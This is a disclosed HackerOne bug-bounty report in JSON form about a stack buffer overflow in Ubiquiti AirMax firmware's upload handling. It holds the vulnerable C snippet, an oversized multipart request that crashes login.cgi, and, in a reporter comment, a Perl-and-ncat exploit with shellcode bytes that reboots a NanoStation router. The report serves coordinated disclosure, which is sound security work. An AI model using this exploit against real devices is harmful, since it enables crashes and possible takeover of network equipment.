{"id":74025,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NDAyNQ==","url":"https://hackerone.com/reports/74025","title":"Yet another Buffer Overflow in PHP of the AirMax Products","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-07-05T17:04:12.735Z","submitted_at":"2015-07-05T17:04:12.735Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"93c08539","url":"/93c08539","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":800,"url":"https://hackerone.com/ui","handle":"ui","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ubiquiti Inc.","twitter_handle":"ubnt","website":"https://ui.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-04-07T22:00:33.249Z","bug_reporter_agreed_on_going_public_at":"2016-03-08T22:00:21.616Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"It's me again!\r\n\r\nAfter the Report [#73491](https://hackerone.com/reports/73491) and the [#74004](https://hackerone.com/reports/74004), I bring another Buffer Overflow, this one look more like #74004, which is a overflow in stack.\r\n\r\nHas you can see bellow, is copied to the var `line` a content (POST data in this case) which can go beyond the content of the original variable. \r\n```\r\nint ub_process_content(struct upload_buffer* ub)\r\n{\r\n\tchar  line[512];\r\n\tsize_t length;\r\n\t\r\n/** some code **/\r\n\t\tif ((~ub-\u003egot) \u0026 GOT_BOUNDARY) {\r\n\t\t\teol = (char*)memmem(ptr, size, \"\\r\\n\", 2);\r\n\t\t\tif (!eol) break;\r\n\r\n\t\t\tlength = eol - ptr + 2;\r\n\t\t\tmemcpy(line, ptr, length); //!!Problem!!//\r\n\t\t\tline[length] = 0;\r\n\r\n\t/** some code **/\r\n}\r\n```\r\n\r\nAll what we need its a line with more than 512 bytes, example of request:\r\n```\r\nPOST /login.cgi HTTP/1.1\r\nHost: 127.0.0.1:8081\r\nUser-Agent: curl/7.43.0\r\nAccept: */*\r\nContent-Length: 700\r\nContent-Type: multipart/form-data; boundary=------------------------2ad2f036dd647428\r\n\r\n--------------------------2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\r\nContent-Disposition: form-data; name=\"file\"; filename=\"AAA\"\r\nContent-Type: application/octet-stream\r\n\r\nAAAA\r\n--------------------------2ad2f036dd647428--\r\n```\r\n\r\nWhen the var `ptr` point to the first line (of the POST content) it will have more the 512  bytes until \"\\r\\n\" and will overflow  the var `line`. As always it will cause a segmentation fault (probably because of overwriting of the return pointer), and the cgi will die with the return of the code 11, identical to the report #74004.\r\n\r\nSorry if I'am Bothering you with to much reports, I will wait your reply (or one week) to send another ones. ","vulnerability_information_html":"\u003cp\u003eIt\u0026#39;s me again!\u003c/p\u003e\n\n\u003cp\u003eAfter the Report \u003ca href=\"https://hackerone.com/reports/73491\"\u003e#73491\u003c/a\u003e and the \u003ca href=\"https://hackerone.com/reports/74004\"\u003e#74004\u003c/a\u003e, I bring another Buffer Overflow, this one look more like \u003ca href=\"/reports/74004\"\u003e#74004\u003c/a\u003e, which is a overflow in stack.\u003c/p\u003e\n\n\u003cp\u003eHas you can see bellow, is copied to the var \u003ccode\u003eline\u003c/code\u003e a content (POST data in this case) which can go beyond the content of the original variable. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eint ub_process_content(struct upload_buffer* ub)\n{\n    char  line[512];\n    size_t length;\n\n/** some code **/\n        if ((~ub-\u0026gt;got) \u0026amp; GOT_BOUNDARY) {\n            eol = (char*)memmem(ptr, size, \u0026quot;\\r\\n\u0026quot;, 2);\n            if (!eol) break;\n\n            length = eol - ptr + 2;\n            memcpy(line, ptr, length); //!!Problem!!//\n            line[length] = 0;\n\n    /** some code **/\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAll what we need its a line with more than 512 bytes, example of request:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /login.cgi HTTP/1.1\nHost: 127.0.0.1:8081\nUser-Agent: curl/7.43.0\nAccept: */*\nContent-Length: 700\nContent-Type: multipart/form-data; boundary=------------------------2ad2f036dd647428\n\n--------------------------2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\nContent-Disposition: form-data; name=\u0026quot;file\u0026quot;; filename=\u0026quot;AAA\u0026quot;\nContent-Type: application/octet-stream\n\nAAAA\n--------------------------2ad2f036dd647428--\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen the var \u003ccode\u003eptr\u003c/code\u003e point to the first line (of the POST content) it will have more the 512  bytes until \u0026quot;\\r\\n\u0026quot; and will overflow  the var \u003ccode\u003eline\u003c/code\u003e. As always it will cause a segmentation fault (probably because of overwriting of the return pointer), and the cgi will die with the return of the code 11, identical to the report \u003ca href=\"/reports/74004\"\u003e#74004\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eSorry if I\u0026#39;am Bothering you with to much reports, I will wait your reply (or one week) to send another ones. \u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-04-07T22:00:21.953Z","allow_singular_disclosure_after":-149157877.80941764,"singular_disclosure_allowed":true,"vote_count":2,"voters":["dyabla","prowser"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":502208,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It remains vulnerable on v5.6.1.","markdown_message":"\u003cp\u003eIt remains vulnerable on v5.6.1.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-07T17:57:19.629Z","updated_at":"2015-07-07T17:57:19.629Z","actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":544216,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You didn't ask, but here is the proof-of-concept exploit:\n\nIt has created for the `NanoStation Loco M2` with the last firmware (`XM.v5.6.2.27929.150716.1201`).\n```\nperl -e 'print  \"POST /login.cgi HTTP/1.1\\r\\n\",\n                \"Host: 192.168.1.20\\r\\n\",\n                \"User-Agent: curl/7.43.0\\r\\n\",\n                \"Accept: */*\\r\\n\",\n                \"Content-Length: 836\\r\\n\",\n                \"Content-Type: multipart/form-data; boundary=------------------------98f1de9547324c34\\r\\n\",\n                \"\\r\\n\",\n                \"Z\"x524, \"JJJJ\\x2A\\xBE\\xBB\\xE4HHHHGGGGFFFFEEEEDDDDCCCCBBBB\\x2A\\xC1\\xA0\\x5C\", \n                \"Z\"x24, \"KKKKJJJJ\\x2A\\xC0\\x4F\\x18zzzz\", \n                \"Z\"x24, \"\\x2A\\xC2\\x47\\xC0zzzz\", \n                \"\\x3c\\x06\\x43\\x21\\x34\\xc6\\xfe\\xdc\\x3c\\x05\\x28\\x12\\x34\\xa5\\x19\\x69\\x3c\\x04\\xfe\\xe1\\x34\\x84\\xde\\xad\\x24\\x02\\x0f\\xf8\\x01\\x01\\x01\\x0c\", \n                \"\\r\\n\",\n                \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"upfile\\\"\\r\\n\",\n                \"Content-Type: application/octet-stream\\r\\n\",\n                \"\\r\\n\",\n                \"AnyDataHere\\r\\n\",\n                \"\\r\\n\",\n                \"--------------------------98f1de9547324c34--\\r\\n\"' | ncat --ssl 192.168.1.20 443\n```\n\nIt will reboot the router, maybe it don't work at first try and will take some seconds to reboot. All what you will need it's `perl` and `ncat` (nmap).","markdown_message":"\u003cp\u003eYou didn\u0026#39;t ask, but here is the proof-of-concept exploit:\u003c/p\u003e\n\n\u003cp\u003eIt has created for the \u003ccode\u003eNanoStation Loco M2\u003c/code\u003e with the last firmware (\u003ccode\u003eXM.v5.6.2.27929.150716.1201\u003c/code\u003e).\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eperl -e \u0026#39;print  \u0026quot;POST /login.cgi HTTP/1.1\\r\\n\u0026quot;,\n                \u0026quot;Host: 192.168.1.20\\r\\n\u0026quot;,\n                \u0026quot;User-Agent: curl/7.43.0\\r\\n\u0026quot;,\n                \u0026quot;Accept: */*\\r\\n\u0026quot;,\n                \u0026quot;Content-Length: 836\\r\\n\u0026quot;,\n                \u0026quot;Content-Type: multipart/form-data; boundary=------------------------98f1de9547324c34\\r\\n\u0026quot;,\n                \u0026quot;\\r\\n\u0026quot;,\n                \u0026quot;Z\u0026quot;x524, \u0026quot;JJJJ\\x2A\\xBE\\xBB\\xE4HHHHGGGGFFFFEEEEDDDDCCCCBBBB\\x2A\\xC1\\xA0\\x5C\u0026quot;, \n                \u0026quot;Z\u0026quot;x24, \u0026quot;KKKKJJJJ\\x2A\\xC0\\x4F\\x18zzzz\u0026quot;, \n                \u0026quot;Z\u0026quot;x24, \u0026quot;\\x2A\\xC2\\x47\\xC0zzzz\u0026quot;, \n                \u0026quot;\\x3c\\x06\\x43\\x21\\x34\\xc6\\xfe\\xdc\\x3c\\x05\\x28\\x12\\x34\\xa5\\x19\\x69\\x3c\\x04\\xfe\\xe1\\x34\\x84\\xde\\xad\\x24\\x02\\x0f\\xf8\\x01\\x01\\x01\\x0c\u0026quot;, \n                \u0026quot;\\r\\n\u0026quot;,\n                \u0026quot;Content-Disposition: form-data; name=\\\u0026quot;file\\\u0026quot;; filename=\\\u0026quot;upfile\\\u0026quot;\\r\\n\u0026quot;,\n                \u0026quot;Content-Type: application/octet-stream\\r\\n\u0026quot;,\n                \u0026quot;\\r\\n\u0026quot;,\n                \u0026quot;AnyDataHere\\r\\n\u0026quot;,\n                \u0026quot;\\r\\n\u0026quot;,\n                \u0026quot;--------------------------98f1de9547324c34--\\r\\n\u0026quot;\u0026#39; | ncat --ssl 192.168.1.20 443\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt will reboot the router, maybe it don\u0026#39;t work at first try and will take some seconds to reboot. All what you will need it\u0026#39;s \u003ccode\u003eperl\u003c/code\u003e and \u003ccode\u003encat\u003c/code\u003e (nmap).\u003c/p\u003e\n","automated_response":false,"created_at":"2015-08-11T11:36:56.530Z","updated_at":"2015-08-11T11:42:39.385Z","actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":616222,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, have been some time since this report has been uploaded (like #74004, #73491 and #73289), , and I seen in the Ubiquiti Community (airMAX Beta Blog), that you launch some php2 fixes. So I want to know if you can send me the source code of the AirMax (if not all, just the php2), so I can close some of this reports, with have been open 3 months already. \n\nBy the way, if you send me the code, I could prevent new bugs before their been implemented in the final version.","markdown_message":"\u003cp\u003eHi, have been some time since this report has been uploaded (like \u003ca href=\"/reports/74004\"\u003e#74004\u003c/a\u003e, \u003ca href=\"/reports/73491\"\u003e#73491\u003c/a\u003e and \u003ca href=\"/reports/73289\"\u003e#73289\u003c/a\u003e), , and I seen in the Ubiquiti Community (airMAX Beta Blog), that you launch some php2 fixes. So I want to know if you can send me the source code of the AirMax (if not all, just the php2), so I can close some of this reports, with have been open 3 months already. \u003c/p\u003e\n\n\u003cp\u003eBy the way, if you send me the code, I could prevent new bugs before their been implemented in the final version.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-09T23:52:43.059Z","updated_at":"2015-10-09T23:52:43.059Z","actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":621705,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Helo? Are you still reading these reports?","markdown_message":"\u003cp\u003eHelo? Are you still reading these reports?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-15T11:07:30.136Z","updated_at":"2015-10-15T11:07:30.136Z","actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":622464,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there,\n\nI will get you updates for your remaining reports early next week.  At least one of these has been addressed.\n\nThanks for testing!\n\nJames","markdown_message":"\u003cp\u003eHi there,\u003c/p\u003e\n\n\u003cp\u003eI will get you updates for your remaining reports early next week.  At least one of these has been addressed.\u003c/p\u003e\n\n\u003cp\u003eThanks for testing!\u003c/p\u003e\n\n\u003cp\u003eJames\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-16T01:08:22.724Z","updated_at":"2015-10-16T01:08:22.724Z","actor":{"username":"ubnt-james","cleared":false,"url":"/ubnt-james","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":626258,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2015-10-20T15:45:32.752Z","updated_at":"2015-10-20T15:45:32.752Z","actor":{"url":"/ui","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ubiquiti Inc."}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ui","collaborator":{"username":"93c08539","url":"/93c08539"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":626260,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2015-10-20T15:45:43.191Z","updated_at":"2015-10-20T15:45:43.191Z","actor":{"username":"ubnt-james","cleared":false,"url":"/ubnt-james","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"93c08539","url":"/93c08539"},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":829858,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-08T22:00:21.641Z","updated_at":"2016-03-08T22:00:21.641Z","first_to_agree":true,"actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":895016,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-07T22:00:33.268Z","updated_at":"2016-04-07T22:00:33.268Z","actor":{"url":"/ui","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ubiquiti Inc."}},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}